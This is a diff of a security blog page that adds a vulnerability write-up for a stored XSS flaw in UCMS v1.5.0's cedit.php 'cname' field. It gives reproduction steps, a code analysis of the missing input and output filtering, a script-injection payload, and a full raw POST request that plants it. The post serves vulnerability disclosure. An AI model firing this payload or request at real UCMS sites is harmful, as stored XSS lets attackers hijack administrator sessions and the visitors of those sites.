@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>LS-Loophole</title>
+  <title>&#39;UCMS v1.5.0 XSS cedit cname parameters&#39; | LS-Loophole</title>
   <meta name="keywords" content="">
-  <meta name="description" content="LS-Loophole">
+  <meta name="description" content="&#39;UCMS v1.5.0 XSS cedit cname parameters&#39; | LS-Loophole">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="UCMS v.1.5.0 Command executionVulnerability Type :Eval injection Vulnerability Version :1.5.0 Recurring environment: Windows 10 PHP 5.4.5 Apache 2.4.23  Vulnerability Description AND recurrence:1、The">
 <meta property="og:type" content="article">
@@ -62,7 +62,7 @@
 
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/img/avatar.jpg" />
@@ -197,12 +197,43 @@
         </div>
     </div>
 </aside>
-<div id="post" class="index">
+<div id="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-UCMS v1.5.0 XSS cedit cname parameters" class="article article-type-post" itemscope itemprop="blogPost">
     
+        <h1 class="article-title">&#39;UCMS v1.5.0 XSS cedit cname parameters&#39;</h1>
+    
+    <div class="article-meta">
         
+        
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2020-09-22 19:44:21'>2020-09-22 19:34</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UCMS-v1-5-0-XSS-cedit-cname-parameters"><span class="toc-text">UCMS v1.5.0 XSS cedit cname parameters</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Type"><span class="toc-text">Vulnerability Type :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Version"><span class="toc-text">Vulnerability Version :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recurring-environment"><span class="toc-text">Recurring environment:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Description-AND-recurrence"><span class="toc-text">Vulnerability Description AND recurrence:</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -215,15 +246,95 @@
     }
 </style>
 </div>
-            <p>测试站</p>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="UCMS-v1-5-0-XSS-cedit-cname-parameters"><a href="#UCMS-v1-5-0-XSS-cedit-cname-parameters" class="headerlink" title="UCMS v1.5.0 XSS cedit cname parameters"></a>UCMS v1.5.0 XSS cedit cname parameters</h1><h2 id="Vulnerability-Type"><a href="#Vulnerability-Type" class="headerlink" title="Vulnerability Type :"></a>Vulnerability Type :</h2><p>Cross Site Scripting(XSS)</p>
+<h2 id="Vulnerability-Version"><a href="#Vulnerability-Version" class="headerlink" title="Vulnerability Version :"></a>Vulnerability Version :</h2><p>1.5.0</p>
+<h2 id="Recurring-environment"><a href="#Recurring-environment" class="headerlink" title="Recurring environment:"></a>Recurring environment:</h2><ul>
+<li>Windows 10</li>
+<li>PHP 5.4.5</li>
+<li>Apache 2.4.23</li>
+</ul>
+<h2 id="Vulnerability-Description-AND-recurrence"><a href="#Vulnerability-Description-AND-recurrence" class="headerlink" title="Vulnerability Description AND recurrence:"></a>Vulnerability Description AND recurrence:</h2><p>There is a stored XSS vulnerability in \ucms\sadmin\cedit.php.</p>
+<p>Vulnerability recurrence:</p>
+<p>1.First create a vulnerability page and visit the following URL:<br><a target="_blank" rel="noopener" href="http://www.ucm1.5.0.com/ucms/index.php?do=sadmin">http://www.ucm1.5.0.com/ucms/index.php?do=sadmin</a>. Click to add a column and enter ceshi in the column name to create a page</p>
+<p><img src="/imgss/16.png"></p>
+<p>2.Visit the vulnerability URL:</p>
+<p><a target="_blank" rel="noopener" href="http://www.ucm1.5.0.com/ucms/index.php?do=sadmin">http://www.ucm1.5.0.com/ucms/index.php?do=sadmin</a> and click &quot;column configuration&quot;</p>
+<p><img src="/imgss/17.png"></p>
+<p>3.The trigger point of the vulnerability is in the column name, enter XSS PayLoad&apos;ceshi&lt;/h3&gt;&lt;script&gt;alert(&apos;cnvd&apos;)&lt;/script&gt;&apos; here</p>
+<p><img src="/imgss/18.png"></p>
+<p>4.Save the column name and refresh again to trigger the storage XSS vulnerability<br><img src="/imgss/19.png"></p>
+<p>Vulnerability analysis</p>
+<ol>
+<li>First look at our XSS PayLoad &quot;ceshi&lt;/h3&gt;&lt;script&gt;alert(&apos;cnvd&apos;)&lt;/script&gt;&quot;. Because the front-end vulnerability point output is in the h3 tag, we need to use the &lt;/h3&gt; tag to close</li>
+</ol>
+<p><img src="/imgss/20.png"></p>
+<ol start="2">
+<li>There are two main points here, one is that there is no filtering when stored in the database, and the other is that the XSS filter function is not used when outputting</li>
+</ol>
+<ol start="3">
+<li>First look at the stored in the database without filtering. Locate the storage file /ucms/index.php?do=sadmin_ceditpost where the front-end data is transferred to the back-end. In this statement, our data is directly written into the table without filtering</li>
+</ol>
+<p><img src="/imgss/21.png"></p>
+<ol start="4">
+<li>The $cname in line 143 is a variable that stores XSS data, and we push it up here. Look for the process of copying and transforming this variable. Here you can see that there is only one $cname=dbstr($_POST[&apos;cname&apos;]); and there is no filtering on this parameter below, indicating that this is a direct conversion of $_POST[&apos;cname &apos;] data is saved into the ucms_channel database!</li>
+</ol>
+<p><img src="/imgss/22.png"></p>
+<ol start="5">
+<li>After reading the vulnerable stored procedure, look at the read triggering process again! The vulnerability is triggered on line 26 of the \ucms\sadmin\cedit.php page, where $link[&apos;cname&apos;] outputs our vulnerability xss PayLoad.</li>
+</ol>
+<p><img src="/imgss/23.png"></p>
+<ol start="6">
+<li>Looking up here, you can see that the $link array is queried from the ucms_channel database. And we just saw in step 4 that the program writes the payload of the storage vulnerability into the database without filtering.</li>
+</ol>
+<p><img src="/imgss/24.png"></p>
+<ol start="7">
+<li>The $link[&apos;cname&apos;] here corresponds to the vulnerability points previously stored in ceditpost.php. And there is no filtering here, just output xss PayLoad directly!</li>
+</ol>
+<p><img src="/imgss/25.png"></p>
+<p>PayLoad</p>
+<pre><code>POST /ucms/?do=sadmin_ceditpost HTTP/1.1
+Host: www.ucm1.5.0.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://www.ucm1.5.0.com/ucms/?do=sadmin_cedit&amp;amp;cid=4
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 657
+Connection: close
+Cookie: admin_a83bb0=admin; psw_a83bb0=6609024d5fb57f730314b384acb138e4; 
+token_a83bb0=8a0b8a85; admin_ba3e0b=admin; 
+psw_ba3e0b=a69740dcfe6f719f3d2342de92331f8c; token_ba3e0b=d45fd502; 
+admin_7783c8=admin; psw_7783c8=06597b3a724e1f8748b2d0098727e163; 
+token_7783c8=3cc0d357
+Upgrade-Insecure-Requests: 1
 
-        </article>
-        
-        <p>
-            <a  class="dashang" onclick="dashangToggle()">赏</a>
-        </p>
-        
-        
+uuu_token=3cc0d357&amp;amp;cid=4&amp;amp;fid=0&amp;amp;cname=ceshi%3C%2Fh3%3E%3Cscript%3Ealert%28%27cnvd%27%29%3C%2Fscript%3E&amp;amp;channeldomain=&amp;amp;cnote=&amp;amp;ckind=1&amp;amp;ifshowadmin=0&amp;amp;ifshowleft=0&amp;amp;ifshownav1=on&amp;amp;channel_url1=%2F%28cid%29%2F&amp;amp;channel_urlcache1=0&amp;amp;template1=page.php&amp;amp;articletable=ucms_article&amp;amp;listadminuid=on&amp;amp;ifshownav2=on&amp;amp;temppage_size=15&amp;amp;temppage_order=id+desc&amp;amp;channel_url2=%2F%28cid%29%2F&amp;amp;channel_urlcache2=0&amp;amp;template2=page.php&amp;amp;channel_pageurl=%2F%28cid%29%2Fpage_%28page%29.html&amp;amp;channel_pageurlcache=0&amp;amp;templatelist=list.php&amp;amp;channel_articleurl=%2F%28cid%29%2F%28id%29.html&amp;amp;channel_articleurlcache=0&amp;amp;templatearticle=article.php&amp;amp;ifshownav5=on&amp;amp;cvalue=&amp;amp;ifshownav3=on&amp;amp;cvalue1=&amp;amp;corder=5
+</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">
@@ -232,11 +343,11 @@
 <p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
     </div>
-</div>
-<div class="full-toc">
-    <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
 <a class="" id="rocket" ></a>
 
+    </div>
 </div>
 
 <div class="hide_box" onclick="dashangToggle()"></div>
